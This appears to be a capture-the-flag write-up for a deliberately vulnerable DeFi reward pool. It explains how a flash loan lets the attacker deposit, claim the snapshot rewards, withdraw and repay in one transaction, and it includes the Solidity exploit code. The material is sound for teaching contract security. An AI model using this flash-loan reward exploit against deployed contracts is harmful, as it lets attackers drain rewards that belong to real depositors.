## The Rewarder solution

In this challenge we have to claim almost all rewards from the `TheRewarderPool` for ourselves. The pool uses snapshot mechanism, remembering the token supply and balances for later access. It mints `accountingTokens` for the `dvt` tokens deposited to the pool on 1:1 ratio, that are used to calculate the rewards. There is also a `withdraw` function, which burns the `accountingTokens` and transfers the `dvt`.
The issue here is that anybody can withdraw their `dvt` tokens at any point in time, so it is easy to claim all the rewards using a flashloan.

```
    function attack() public {
        flashPool.flashLoan(dvt.balanceOf(address(flashPool)));
    }
```
```
    fallback() external {
        uint256 loanAmount = dvt.balanceOf(address(this));
        dvt.approve(address(rewarderPool), loanAmount);
        rewarderPool.deposit(loanAmount);
        _withdrawRewards();
        rewarderPool.withdraw(loanAmount);
        dvt.transfer(address(flashPool), loanAmount);
    }
```